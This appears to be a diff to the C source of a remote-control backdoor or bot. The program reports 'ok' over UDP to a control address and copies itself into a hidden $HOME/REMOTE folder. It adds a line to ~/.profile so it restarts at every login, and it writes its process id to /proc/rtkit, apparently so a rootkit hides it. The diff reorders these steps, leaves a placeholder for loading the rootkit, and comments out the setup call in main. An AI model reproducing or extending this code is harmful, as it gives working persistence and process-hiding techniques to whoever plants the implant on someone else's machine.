@@ -50,6 +50,7 @@ void *start_routine(void *arg) {
 
 void sendOnline() {
     int x;
+    bzero(datagram, LENGTH);
     x = sendto(sockfd, "ok", 2, 0, (struct sockaddr *)&control_add, sizeof(control_add));
     if (x == -1)
         printError(2, strerror(errno));
@@ -60,14 +61,20 @@ void initRemote() {
     char command[256];
     FILE *fp;
 
-    // Hidden process
     bzero(command, sizeof(command));
-    sprintf(command, "echo -n hp%d > /proc/rtkit", pid);
-    fp = popen(command, "r");
-    pclose(fp);
     strcpy(command, "[ -d $HOME/REMOTE ] || mkdir $HOME/REMOTE\n\
                      [ -d $HOME/REMOTE/remote ] || cp ./remote $HOME/REMOTE\n\
                      grep -q \"$HOME/REMOTE/remote&\" $HOME/.profile || echo \"\n$HOME/REMOTE/remote&\" >> $HOME/.profile");
+    fp = popen(command, "r");
+    pclose(fp);
+    // Insmod the rootkit
+    // bzero(command, sizeof(command));
+    // strcpy(command, "");
+    // fp = popen(command, "r");
+    // pclose(fp);
+    // Hidden process
+    bzero(command, sizeof(command));
+    sprintf(command, "echo -n hp%d > /proc/rtkit", pid);
     fp = popen(command, "r");
     pclose(fp);
 }
@@ -82,7 +89,7 @@ int main(int argc, char const *argv[]) {
     FILE *fp;  // It will open a stream for the output of command
 
     // Initialize the host machine
-    initRemote();
+    // initRemote();
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     bzero(&control_add, sizeof(control_add));
